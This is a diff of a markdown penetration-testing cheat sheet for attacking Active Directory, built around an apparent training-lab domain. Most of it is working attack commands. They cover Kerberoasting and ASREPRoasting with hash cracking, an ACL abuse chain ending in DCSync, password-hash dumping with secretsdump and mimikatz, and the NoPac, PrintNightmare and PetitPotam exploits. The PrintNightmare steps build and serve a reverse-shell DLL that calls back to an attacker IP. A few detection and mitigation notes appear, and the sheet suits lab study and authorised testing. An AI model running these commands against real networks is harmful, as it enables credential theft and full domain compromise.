-### From Windows — Rubeus
+## Kerberoasting - from Windows
+
+Semi-manual (setspn + .NET + Mimikatz):
 
 ```powershell
-# Stats overview
-.\Rubeus.exe kerberoast /stats
-
-# All tickets (high-value: admincount=1)
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
-
-# Single user
-.\Rubeus.exe kerberoast /user:sqldev /nowrap
-
-# Force RC4 on AES accounts (faster cracking)
-.\Rubeus.exe kerberoast /rc4opsec /nowrap
-.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
-
-# Cross-forest
-.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
-```
-
-### From Windows — PowerView + Mimikatz (manual)
-
-```powershell
-# Request ticket into memory
+setspn.exe -Q */*          # enumerate SPNs (focus on user accounts, ignore computers)
 Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"   # requests TGS into memory
+```
 
-# Export with Mimikatz
+```cmd
 mimikatz # base64 /out:true
-mimikatz # kerberos::list /export
+mimikatz # kerberos::list /export       :: .kirbi files or base64 blobs
 ```
 
+Cracking pipeline for kirbis:
+
 ```bash
-# Process exported .kirbi or base64 blob
-echo "<base64>" | tr -d \\n | base64 -d > sqldev.kirbi
+cat encoded_file | tr -d \\n | base64 -d > sqldev.kirbi
 python2.7 kirbi2john.py sqldev.kirbi
-sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > hashcat_format
-hashcat -m 13100 hashcat_format /usr/share/wordlists/rockyou.txt
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+hashcat -m 13100 sqldev_tgs_hashcat rockyou.txt
 ```
 
-> [!warning] AES tickets (etype 18) crack ~100x slower than RC4 (etype 23). Use `/tgtdeleg` or `/rc4opsec` to force RC4 downgrade. Does NOT work against Windows Server 2019 DCs — will always return highest supported encryption.
-
----
-
-## ASREPRoasting
-
-**Concept:** Users with `DONT_REQ_PREAUTH` set → request AS-REP without password. Encrypted with user's hash → crack offline. Hashcat mode `18200`.
-
-```bash
-# From Linux — find + retrieve
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
-
-# From Linux — single user
-GetNPUsers.py INLANEFREIGHT.LOCAL/mmorgan -dc-ip 172.16.5.5 -no-pass
-
-# Crack
-hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
-```
+PowerView:
 
 ```powershell
-# PowerView — find targets
-Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
-
-# Rubeus
-.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
-
-# Kerbrute — auto-extracts AS-REP during user enum
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 
----
-
-## ACL Enumeration & Abuse
-
-**Key ACEs for attack:**
-
-|ACE|Abuse Method|
-|---|---|
-|ForceChangePassword|Set-DomainUserPassword|
-|GenericWrite (user)|Set fake SPN → Kerberoast|
-|GenericWrite (group)|Add-DomainGroupMember|
-|GenericAll|All of the above + Set-DomainObjectOwner|
-|WriteOwner|Set-DomainObjectOwner|
-|WriteDACL|Add-DomainObjectACL|
-|AddSelf|Add-DomainGroupMember|
-|DS-Replication-Get-Changes + DS-Replication-Get-Changes-All|DCSync|
-
-### Enumeration
+Rubeus:
 
 ```powershell
-# Get SID of controlled user
+.\Rubeus.exe kerberoast /stats                        # counts by encryption type + pwd-last-set year
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap     # privileged accounts only, no line-wrapping
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+**Encryption types:** tools request RC4 (etype 23) because it cracks fast. `msds-supportedencryptiontypes`: 0 = default RC4, 24 = AES-only. AES-256 ticket on a CPU: ~23 min for full rockyou vs 4s for RC4. `/tgtdeleg` forces RC4 even for AES-enabled accounts on Server 2016 and earlier DCs (backward-compat failsafe); Server 2019 DCs always return the highest etype. GPO "Network security: Configure encryption types allowed for Kerberos" controls this — removing RC4 requires testing.
+
+Detection: event 4769 (Kerberos service ticket requested) floods with encryption 0x17; enable "Audit Kerberos Service Ticket Operations". Fix: gMSA/MSA accounts, strong/long service passwords, no privileged accounts as SPNs.
+
+## Access Control List (ACL) Abuse Primer
+
+- **DACL** = who can access an object (empty DACL = deny all, no DACL = allow all). **SACL** = audit logging.
+- **ACE** = one entry in the DACL: SID + type (allow/deny/audit) + inheritance flags + access mask. Evaluated top-to-bottom until a deny matches.
+
+Abusable rights and their PowerView verbs:
+
+- `ForceChangePassword` → `Set-DomainUserPassword`
+- `Add Members` / `AddSelf` / `GenericAll` (over group) → `Add-DomainGroupMember`
+- `GenericWrite` → `Set-DomainObject` (set an SPN → targeted Kerberoast; or add members)
+- `WriteOwner` → `Set-DomainObjectOwner`; `WriteDACL` → `Add-DomainObjectACL`
+- `AllExtendedRights` → password reset / group add
+- `GenericAll` over a computer + LAPS → read the LAPS password
+
+These never show up in vuln scans and fester for years. Common shapes: help-desk password-reset rights, group-membership management rights, excessive rights from software installs (Exchange). Password resets are destructive — clear it with the client first, document everything, revert changes.
+
+## ACL Enumeration
+
+Targeted enumeration beats dumping everything. Walk the chain from a user you control:
+
+```powershell
 $sid = Convert-NameToSid wley
-
-# Find all objects wley has rights over
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
-
-# Map GUID to readable name (if no ResolveGUIDs)
-$guid = "00299570-246d-11d0-a768-00aa006e0529"
-Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,rightsGuid | ?{$_.rightsGuid -eq $guid}
-
-# Check DCSync rights for a user
-$sid = "S-1-5-21-...-1164"
-Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
-
-# BloodHound: Node Info → Outbound Control Rights → First Degree / Transitive
+# -ResolveGUIDs turns ObjectAceType GUIDs into names (e.g. User-Force-Change-Password)
 ```
 
-### Attack Chain Example (wley → damundsen → Help Desk → IT Group → adunn → DCSync)
+GUID lookup without PowerView (fresh session required):
 
 ```powershell
-# Step 1: Authenticate as wley
-$SecPassword = ConvertTo-SecureString '<wley_password>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$guid = "00299570-246d-11d0-a768-00aa006e0529"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,rightsGuid | ? {$_.rightsGuid -eq $guid}
+```
 
-# Step 2: Force change damundsen's password (ForceChangePassword right)
+Built-in-only alternative (slow but tool-free):
+
+```powershell
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) { get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+```
+
+Module's worked chain: wley → ForceChangePassword over damundsen → damundsen has GenericWrite on "Help Desk Level 1" group → that group nests into Information Technology → IT has GenericAll over adunn → adunn holds DS-Replication-Get-Changes + ...-In-Filtered-Set = DCSync rights.
+
+BloodHound shows the same thing instantly: Node Info → Outbound Control Rights → First Degree / Transitive Object Control; right-click any edge → Help (abuse info + opsec + references).
+
+## ACL Abuse Tactics
+
+Executing the chain:
+
+```powershell
+# 1. wley resets damundsen's password
+$SecPassword = ConvertTo-SecureString '<WLEY_PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 
-# Step 3: Auth as damundsen
-$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)
-
-# Step 4: Add damundsen to Help Desk Level 1 (GenericWrite over group)
+# 2. damundsen (GenericWrite) joins the group
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 
-# Step 5: Set fake SPN on adunn (GenericAll via IT Group → adunn)
-# (damundsen inherits IT Group rights via Help Desk Level 1 nested membership)
+# 3. via nested IT membership: GenericAll over adunn → targeted Kerberoasting (safer than resetting an admin's password)
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
-
-# Step 6: Kerberoast adunn
 .\Rubeus.exe kerberoast /user:adunn /nowrap
-# Crack hash → get adunn's password
-
-# Cleanup (reverse order)
-Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
-Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+# crack with hashcat -m 13100
 ```
 
----
+Cleanup, in the right order (lose the group rights first and you can't remove the SPN):
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+# restore damundsen's original password or have the client reset it
+```
+
+From Linux: `pth-net` (pth-toolkit) and `targetedKerberoast` (creates temp SPN, roasts, deletes it in one shot).
+
+Detection: event 5136 (directory service object modified); SDDL in the details is unreadable — `ConvertFrom-SddlString "<sddl>"` renders it, filter on DiscretionaryAcl.
 
 ## DCSync
 
-**Requirement:** Account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (default: Domain Admins, Enterprise Admins)
+Mimic a DC via the Directory Replication Service (DRSUAPI) to pull password hashes. Requires an account with Replicating Directory Changes + Replicating Directory Changes All (Domain/Enterprise Admins have it; so do misconfigured standard users — check with:
+
+```powershell
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
+```
+
+From Linux:
 
 ```bash
-# From Linux
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
-# Files produced: .ntds, .ntds.cleartext, .ntds.kerberos
+# variants: -just-dc-ntlm (hashes only), -just-dc-user <USER>, -pwd-last-set, -history, -user-status (skip disabled accounts in cracking stats)
+```
 
-# Useful flags
-# -just-dc-ntlm  = NTLM only
-# -just-dc-user  = single user
-# -pwd-last-set  = include password age
-# -history       = include password history
-# -user-status   = enabled/disabled flag
+Output files: `.ntds` (hashes), `.ntds.kerberos` (keys), `.ntds.cleartext` — cleartext appears for accounts with reversible encryption set (`Get-ADUser -Filter 'userAccountControl -band 128'`; stored RC4-encrypted with the SYSKEY, decrypted automatically by secretsdump).
+
+From Windows (must run in the DCSync-privileged user's context — `runas /netonly /user:INLANEFREIGHT\adunn powershell` first):
+
+```cmd
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+
+## Privileged Access
+
+No local admin anywhere? Check execution rights (BloodHound edges: CanRDP, CanPSRemote, SQLAdmin):
+
+```powershell
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"      # Domain Users = everyone can RDP
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"   # WinRM without local admin
+```
+
+Custom Cypher for WinRM rights:
+
+```text
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
 ```
 
 ```powershell
-# From Windows — Mimikatz (must run in context of account with DCSync rights)
-# If needed: runas /netonly /user:INLANEFREIGHT\adunn powershell
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL
-```
-
-**Cleartext from reversible encryption:**
-
-```bash
-cat inlanefreight_hashes.ntds.cleartext   # accounts with ENCRYPTED_TEXT_PWD_ALLOWED
-
-# Check which users have reversible encryption
-Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
-Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
-```
-
----
-
-## Privileged Access — RDP / WinRM / MSSQL
-
-### RDP Enumeration & Access
-
-```powershell
-# Enumerate RDP access
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
-# BloodHound: Node Info → Execution Rights → CanRDP
-# BloodHound pre-built: "Find Workstations where Domain Users can RDP"
-
-# Connect
-xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
-```
-
-### WinRM Enumeration & Access
-
-```powershell
-# Enumerate
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
-# BloodHound Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
-
-# Connect from Windows
-$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
-$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\forend", $password)
 Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
 ```
 
 ```bash
-# Connect from Linux
-evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
-evil-winrm -i 10.129.201.234 -u forend -H <NTLM_HASH>   # pass-the-hash
+evil-winrm -i <TARGET_IP> -u forend          # or -H <NTHASH>; -r <REALM> for Kerberos
 ```
 
-### MSSQL Enumeration & Access
+SQL admin (SQLAdmin edge; creds often via Kerberoasting or Snaffler-found web.config):
 
 ```powershell
-# Enumerate with PowerUpSQL
 Import-Module .\PowerUpSQL.ps1
-Get-SQLInstanceDomain
-Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
-# BloodHound Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+Get-SQLInstanceDomain                                            # find instances
+Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "<PASSWORD>" -query 'Select @@version'
 ```
 
 ```bash
-# From Linux
-mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+mssqlclient.py INLANEFREIGHT/damundsen@172.16.5.150 -windows-auth
 SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami /priv
-# SeImpersonatePrivilege = path to SYSTEM via PrintSpoofer/RoguePotato
+SQL> xp_cmdshell whoami /priv       # SQL service accounts almost always hold SeImpersonatePrivilege
 ```
 
-### Kerberos Double Hop — Workarounds
+Any MSSQL credential found anywhere gets tested against every SQL server in scope — it's near-guaranteed host SYSTEM via potato-style privesc.
 
-**Problem:** WinRM/PSRemoting uses Kerberos tickets (not passwords) → credentials not cached → can't authenticate to 3rd host.
+## Kerberos "Double Hop" Problem
+
+WinRM authenticates with a TGS for that one host; the user's TGT/credentials never land in memory, so the second hop (host → DC for PowerView etc.) fails. `klist` shows only a ticket to the local service; Mimikatz shows blanks where credentials should be.
+
+Workarounds:
+
+1. **PSCredential object** — re-send credentials with each command:
 
 ```powershell
-# Workaround 1: PSCredential object (works with evil-winrm)
-$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
-get-domainuser -spn -credential $Cred | select samaccountname
-
-# Workaround 2: Register PSSession Configuration (requires GUI/RDP, not evil-winrm)
-Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
-Restart-Service WinRM
-Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
-# Now klist shows full TGT cached
+get-domainuser -spn -credential $Cred      # works; without -credential it fails
 ```
 
----
+RDP into the host instead of WinRM and the password IS cached — no double hop at all.
+
+2. **Register-PSSessionConfiguration** (Windows/GUI + elevated PowerShell only; doesn't work from evil-winrm or Linux PowerShell):
+
+```powershell
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+Restart-Service WinRM     # kicks the session
+Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
+klist                     # krbtgt ticket now cached; PowerView works without -Credential
+```
+
+Also possible: nested Invoke-Command, CredSSP, port forwarding, process injection into a sacrificial process.
 
 ## Bleeding Edge Vulnerabilities
 
-### NoPac (CVE-2021-42278 + CVE-2021-42287) — SamAccountName Spoofing
-
-**Requirement:** Standard domain user, ms-DS-MachineAccountQuota > 0 (default: 10)
+**NoPac / SamAccountName Spoofing (CVE-2021-42278 + 42287)** — standard user → Domain Admin in one command. Add a machine account (default quota ms-DS-MachineAccountQuota = 10), rename its sAMAccountName to a DC's name, request tickets (KDC issues under the DC's name), SYSTEM on the DC:
 
 ```bash
-# Check if vulnerable
-sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
-
-# Exploit — get SYSTEM shell on DC
-sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
-
-# Exploit — DCSync
-sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+sudo python3 scanner.py inlanefreight.local/forend:<PASSWORD> -dc-ip 172.16.5.5 -use-ldap
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:<PASSWORD> -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:<PASSWORD> -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
 ```
 
-### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+ccache files land in the working dir — clean them up. smbexec-based shells get flagged by Defender (VirTool:Win32/MSPSEexecCommand).
+
+**PrintNightmare (CVE-2021-34527 / 1675)** — Print Spooler RCE, remote from a standard domain user (cube0x0 exploit + cube0x0's Impacket fork):
 
 ```bash
-# Check Print Spooler exposed
-rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
-
-# Generate DLL payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
-
-# Host payload
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'      # confirm exposed protocols
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > backupscript.dll
 sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
-
-# MSF listener (port 8080)
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 172.16.5.225 / set LPORT 8080
-
-# Exploit
-sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
-# → Meterpreter SYSTEM shell on DC
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:<PASSWORD>@172.16.5.5 '\\<ATTACKER_IP>\CompData\backupscript.dll'
 ```
 
-### PetitPotam (CVE-2021-36942) — MS-EFSRPC
+DC pulls and executes the DLL → SYSTEM Meterpreter. Can crash the spooler — warn the client.
 
-**Requirement:** AD CS present, unauthenticated (patched version requires auth)
+**PetitPotam (CVE-2021-36942)** — unauthenticated coerce-auth via MS-EFSRPC (LSARPC, SMB 445) → relay DC auth to AD CS web enrollment → DC cert → TGT → DCSync:
 
 ```bash
-# Step 1: Start NTLM relay targeting AD CS web enrollment
 sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
-
-# Step 2: Coerce DC authentication
-python3 PetitPotam.py 172.16.5.225 172.16.5.5
-# ntlmrelayx.py obtains base64 cert for DC01$
-
-# Step 3: Request TGT using cert
-python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
-# Note AS-REP encryption key printed
-
-# Step 4: Set KRB5CCNAME + DCSync
-export KRB5CCNAME=dc01.ccache
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-
-# Alternate: get NT hash from TGT
-python /opt/PKINITtools/getnthash.py -key <AS_REP_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
-# Then secretsdump with -hashes aad3c435b514a4ee:<NT_HASH>
+python3 PetitPotam.py <ATTACKER_IP> 172.16.5.5        # EfsRpcOpenFileRaw coerce; "Got expected ERROR_BAD_NETPATH" = success
 ```
+
+Then with the base64 cert:
+
+```bash
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/'ACADEMY-EA-DC01$' -pfx-base64 <B64CERT> dc01.ccache
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+# alternative: getnthash.py -key <AS-REP-key> INLANEFREIGHT.LOCAL/'ACADEMY-EA-DC01$'  → NT hash → -hashes dump
+```
+
+Windows route with the same cert:
 
 ```powershell
-# From Windows — Rubeus with base64 cert
-.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<BASE64_CERT> /ptt
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<B64CERT> /ptt
 mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
 ```
 
----
+Mitigations beyond the patch: EPA + Require SSL on CA web enrollment, disable NTLM on DCs/AD CS/IIS. PetitPotam trigger also lives in Mimikatz (`misc::efs /server:<DC> /connect:<ATTACKER>`) and Invoke-PetitPotam.ps1.
 
 ## Miscellaneous Misconfigurations
 
-### GPP (Group Policy Preferences) Passwords
+- **Exchange groups** — Exchange Windows Permissions members can write a DACL on the domain object → grant DCSync. Organization Management = Exchange's Domain Admins (reads all mailboxes, controls the Exchange Security Groups OU). Compromising an Exchange server = DA + memory full of OWA credentials.
+- **PrivExchange** — any mailbox user can push the Exchange server (SYSTEM) into authenticating to an attacker host; relay to LDAP → NTDS dump. Pre-2019 CU.
+- **Printer bug** — MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx forces spooler (SYSTEM) auth anywhere. Check: `Get-SpoolStatus -ComputerName <HOST>` (SecurityAssessment.ps1). Relay to LDAP → DCSync rights or RBCD.
+- **MS14-068** — forged PAC Kerberos privesc; patch-only defense (PyKEK, Impacket).
+- **LDAP credential sniffing** — printer/app consoles store LDAP creds; retarget the "test connection" button at a netcat listener on 389.
+- **DNS records** — `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5` dumps zone records any user can list (`-r` resolves unknowns); reveals hostnames behind GUID-style computer names.
+- **Description fields**: `Get-DomainUser * | Select samaccountname,description | ? {$_.Description -ne $null}` — passwords live there.
+- **PASSWD_NOTREQD**: `Get-DomainUser -UACFilter PASSWD_NOTREQD` — test for blank passwords.
+- **SYSVOL scripts**: readable by all authenticated users; hunt for passwords (reset_local_admin_pass.vbs etc.).
+- **GPP passwords** — cpassword in SYSVOL XML files (drives/services/scheduled tasks/registry); AES key was published by Microsoft. `gpp-decrypt <cpassword>`; CME modules `gpp_password` and `gpp_autologin` (the latter pulls Registry.xml autologon creds — still unpatched by design).
+- **ASREPRoasting** — accounts with "Do not require Kerberos pre-auth" leak crackable AS-REPs without any credentials:
+
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
 
 ```bash
-# Search SYSVOL manually
-ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
-# Look for Groups.xml, Registry.xml, scheduledtasks.xml, services.xml, printers.xml
-
-# Decrypt cpassword
-gpp-decrypt <CPASSWORD_VALUE>
-
-# CME modules
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+hashcat -m 18200 ilfreight_asrep rockyou.txt
+kerbrute userenum ...              # auto-dumps AS-REP hashes for no-preauth users it finds
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
 ```
 
-### Password in Description / SYSVOL Scripts
+GenericWrite/GenericAll over a user → enable the flag yourself → roast → disable.
+
+- **GPO abuse** — enumerate with `Get-DomainGPO | select displayname` / `Get-GPO -All`; check rights via `Get-DomainGPO | Get-ObjectAcl` against a group SID (module found Domain Users with WriteProperty/WriteDacl over "Disconnect Idle RDP" → SharpGPOAbuse: add local admin, immediate scheduled task, startup script — scoped to a single host, never a 1000-host OU). Audit with group3r.
+
+## Domain Trusts Primer
+
+Trust types: parent-child (two-way transitive, same forest), cross-link (child↔child fast path), external (non-transitive, SID-filtered, separate forests), tree-root, forest (transitive between forest roots), ESAE (bastion forest). Transitive = trust extends to whoever the child trusts (A→B, B→C ⇒ A→C); one-way vs bidirectional directionality. M&A-created trusts often go unreviewed — the trusted "softer" company is a back door into the acquirer.
 
 ```powershell
-# Check description field
-Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
-
-# Check SYSVOL scripts
-ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
-cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
-```
-
-### DNS Enumeration with adidnsdump
-
-```bash
-adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
-adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r    # -r resolves unknown records
-cat records.csv
-```
-
-### Exchange-Related Abuse
-
-```powershell
-# Exchange Windows Permissions group → WriteDACL on domain → DCSync rights
-# Organization Management → full mailbox access
-
-# PrivExchange: PushSubscription feature → force Exchange→attacker auth → LDAP relay → DCSync
-# Printer Bug (MS-RPRN): spooler runs as SYSTEM → force auth → relay or crack
-
-# Check Printer Bug
-Import-Module .\SecurityAssessment.ps1
-Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-```
-
----
-
-## Domain Trusts
-
-### Enumeration
-
-```powershell
-# Built-in
-Get-ADTrust -Filter *
-# Key fields: Direction (BiDirectional/Inbound/Outbound), IntraForest (child domain), ForestTransitive (external forest)
-
-# PowerView
+Get-ADTrust -Filter *                          # IntraForest=True (child) vs ForestTransitive=True (forest trust)
 Get-DomainTrust
-Get-DomainTrustMapping
+Get-DomainTrustMapping                        # whole forest map
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName   # enumerate across trust
+```
 
-# Enumerate users in child domain
-Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
-
-# netdom
+```cmd
 netdom query /domain:inlanefreight.local trust
 netdom query /domain:inlanefreight.local dc
+netdom query /domain:inlanefreight.local workstation
 ```
 
-```bash
-# Linux BloodHound — enumerate trust domains
-# Edit /etc/resolv.conf: domain INLANEFREIGHT.LOCAL, nameserver 172.16.5.5
-bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
